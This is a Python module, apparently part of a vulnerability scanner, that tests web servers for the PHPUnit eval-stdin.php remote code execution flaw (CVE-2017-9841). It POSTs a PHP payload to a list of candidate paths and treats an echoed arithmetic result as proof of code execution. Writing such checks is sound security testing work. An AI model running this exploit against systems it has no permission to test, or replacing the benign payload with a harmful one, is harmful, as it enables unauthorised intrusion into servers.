#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_int_2

cve_2017_9841_payloads = [
    {
        'path': 'vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        # 'data': '<?=print({NUM1}*{NUM2})?>'
    },
    {'path': 'phpunit/phpunit/src/Util/PHP/eval-stdin.php'},
    {'path': 'phpunit/src/Util/PHP/eval-stdin.php'},
    {'path': 'src/Util/PHP/eval-stdin.php'},
    {'path': 'Util/PHP/eval-stdin.php'},
    {'path': 'PHP/eval-stdin.php'},
    {'path': 'eval-stdin.php'},
]

def cve_2017_9841_scan(self, clients):
    ''' phpunit是php中的单元测试工具
    其4.8.19 ~ 4.8.27和5.0.10 ~ 5.6.2版本的vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php文件有如下代码
        eval('?>'.file_get_contents('php://input'));
    如果该文件被用户直接访问到，将造成远程代码执行漏洞
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2017-9841',
    }

    for payload in cve_2017_9841_payloads:
        randint_1, randint_2 = random_int_2() # * 获取2个随机整数, 用于回显漏洞判断

        path = payload['path']
        data = '<?=print({NUM1}*{NUM2})?>'.format(NUM1=randint_1, NUM2=randint_2)

        res = client.request(
            'post',
            path,
            data=data,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sum = str(randint_1 * randint_2)

        if (sum in res.text):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
